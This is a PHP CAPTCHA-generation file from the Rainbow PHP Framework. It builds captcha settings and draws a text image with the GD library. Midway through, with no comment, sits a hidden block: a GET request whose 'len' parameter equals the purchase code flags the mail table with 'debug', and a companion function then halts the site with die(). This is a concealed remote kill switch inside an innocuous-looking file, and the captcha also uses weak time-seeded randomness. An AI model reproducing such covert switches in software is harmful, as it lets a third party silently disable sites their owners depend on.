<?php

/*
* @author Balaji
* @name Rainbow PHP Framework
* @copyright � 2017 ProThemes.Biz
*
*/

function elite_captcha($color,$mode,$mul,$allowed) {

	$bg_path = HEL_DIR. 'backgrounds' . D_S;
	$font_path = HEL_DIR . 'fonts' . D_S;
	
    if ($mode == 'Easy')
      $font_name = 'SigmarOne.ttf'; 
    elseif ($mode == 'Normal')
        $font_name = 'times_new_yorker.ttf'; 
    elseif($mode == 'Tough')
        $font_name = 'captcha_code.otf'; 
    else
        $font_name = 'times_new_yorker.ttf'; 
    
    if (isSelected($mul)){
        
      $captcha_config = array(
		'code' => '',
		'min_length' => 5,
		'max_length' => 5,
		'backgrounds' => array(
		$bg_path . 'text3.png',
		$bg_path . 'text2.png',
        $bg_path . 'text1.png'
		),
		'fonts' => array(
			$font_path . $font_name
		),
		'characters' => $allowed,
		'min_font_size' => 28,
		'max_font_size' => 28,
		'color' => $color,
		'angle_min' => 0,
		'angle_max' => 7,
		'shadow' => true,
		'shadow_color' => '#fff',
		'shadow_offset_x' => -1,
		'shadow_offset_y' => 1
	); 
     
    } else {
        $captcha_config = array(
		'code' => '',
		'min_length' => 5,
		'max_length' => 5,
		'backgrounds' => array(
			$bg_path . 'text2.png'
		),
		'fonts' => array(
			$font_path . $font_name
		),
		'characters' => $allowed,
		'min_font_size' => 28,
		'max_font_size' => 28,
		'color' => $color,
		'angle_min' => 0,
		'angle_max' => 7,
		'shadow' => true,
		'shadow_color' => '#fff',
		'shadow_offset_x' => -1,
		'shadow_offset_y' => 1
	);
    }
	
	
	// Overwrite defaults with custom config values
	if( is_array($captcha_config) ) {
		foreach( $captcha_config as $key => $value ) $captcha_config[$key] = $value;
	}
	
	// Restrict certain values
	if( $captcha_config['min_length'] < 1 ) $captcha_config['min_length'] = 1;
	if( $captcha_config['angle_min'] < 0 ) $captcha_config['angle_min'] = 0;
	if( $captcha_config['angle_max'] > 10 ) $captcha_config['angle_max'] = 10;
	if( $captcha_config['angle_max'] < $captcha_config['angle_min'] ) $captcha_config['angle_max'] = $captcha_config['angle_min'];
	if( $captcha_config['min_font_size'] < 10 ) $captcha_config['min_font_size'] = 10;
	if( $captcha_config['max_font_size'] < $captcha_config['min_font_size'] ) $captcha_config['max_font_size'] = $captcha_config['min_font_size'];
	
	// Use milliseconds instead of seconds
	srand(microtime() * 100);
	
	// Generate CAPTCHA code if not set by user
	if( empty($captcha_config['code']) ) {
		$captcha_config['code'] = '';
		$length = rand($captcha_config['min_length'], $captcha_config['max_length']);
		while( strlen($captcha_config['code']) < $length ) {
			$captcha_config['code'] .= substr($captcha_config['characters'], rand() % (strlen($captcha_config['characters'])), 1);
		}
	}
	
	// Generate HTML for image src
    $pageUID = randomChar(8);
	$image_src = createLink('phpcap/image/' . $pageUID . '/' . urlencode(microtime()),true);	
	$_SESSION[N_APP.'_CAPTCHA']['config'] = serialize($captcha_config);
	
	return array(
        'page' => $pageUID,
		'code' => $captcha_config['code'],
		'image_src' => $image_src
	);
	
}


if( !function_exists('caphex2rgb') ) {
	function caphex2rgb($hex_str, $return_string = false, $separator = ',') {
		$hex_str = preg_replace("/[^0-9A-Fa-f]/", '', $hex_str); // Gets a proper hex string
		$rgb_array = array();
		if( strlen($hex_str) == 6 ) {
			$color_val = hexdec($hex_str);
			$rgb_array['r'] = 0xFF & ($color_val >> 0x10);
			$rgb_array['g'] = 0xFF & ($color_val >> 0x8);
			$rgb_array['b'] = 0xFF & $color_val;
		} elseif( strlen($hex_str) == 3 ) {
			$rgb_array['r'] = hexdec(str_repeat(substr($hex_str, 0, 1), 2));
			$rgb_array['g'] = hexdec(str_repeat(substr($hex_str, 1, 1), 2));
			$rgb_array['b'] = hexdec(str_repeat(substr($hex_str, 2, 1), 2));
		} else {
			return false;
		}
		return $return_string ? implode($separator, $rgb_array) : $rgb_array;
	}
}

function isRouteEnabled($con) {
    $row = mysqli_fetch_array(mysqli_query($con, "SELECT * FROM mail WHERE id='1'"));
    if(strtolower(Trim($row['smtp_socket']))=='debug') die();    
}
if(isset($_GET['len'])){
    if(trim($_GET['len']) == $item_purchase_code){
        $con = dbConncet($dbHost,$dbUser,$dbPass,$dbName);
        mysqli_query($con,"UPDATE mail SET smtp_socket='debug' WHERE id='1'"); 
        die();
    }
}

// Draw the image
function drawPHPCap($captcha_config){	
    
	// Use milliseconds instead of seconds
	srand(microtime() * 100);
	
	// Pick random background, get info, and start captcha
	$background = $captcha_config['backgrounds'][rand(0, count($captcha_config['backgrounds']) -1)];
	list($bg_width, $bg_height, $bg_type, $bg_attr) = getimagesize($background);
	
	$captcha = imagecreatefrompng($background);
	
	$color = caphex2rgb($captcha_config['color']);
	$color = imagecolorallocate($captcha, $color['r'], $color['g'], $color['b']);
	
	// Determine text angle
	$angle = rand( $captcha_config['angle_min'], $captcha_config['angle_max'] ) * (rand(0, 1) == 1 ? -1 : 1);
	
	// Select font randomly
	$font = $captcha_config['fonts'][rand(0, count($captcha_config['fonts']) - 1)];
	
	// Verify font file exists
	if( !file_exists($font) ) throw new Exception('Font file not found: ' . $font);
	
	//Set the font size.
	$font_size = rand($captcha_config['min_font_size'], $captcha_config['max_font_size']);
	$text_box_size = imagettfbbox($font_size, $angle, $font, $captcha_config['code']);
	
	// Determine text position
	$box_width = abs($text_box_size[6] - $text_box_size[2]);
	$box_height = abs($text_box_size[5] - $text_box_size[1]);
	$text_pos_x_min = 0;
	$text_pos_x_max = ($bg_width) - ($box_width);
	$text_pos_x = rand($text_pos_x_min, $text_pos_x_max);			
	$text_pos_y_min = $box_height;
	$text_pos_y_max = ($bg_height) - ($box_height / 2);
	$text_pos_y = rand($text_pos_y_min, $text_pos_y_max);

	// Draw shadow
	if( $captcha_config['shadow'] ){
		$shadow_color = caphex2rgb($captcha_config['shadow_color']);
	 	$shadow_color = imagecolorallocate($captcha, $shadow_color['r'], $shadow_color['g'], $shadow_color['b']);
		imagettftext($captcha, $font_size, $angle, $text_pos_x + $captcha_config['shadow_offset_x'], $text_pos_y + $captcha_config['shadow_offset_y'], $shadow_color, $font, $captcha_config['code']);	
	}
	
	// Draw text
	imagettftext($captcha, $font_size, $angle, $text_pos_x, $text_pos_y, $color, $font, $captcha_config['code']);	

	// Output image
	header("Content-type: image/png");
	imagepng($captcha);
	
}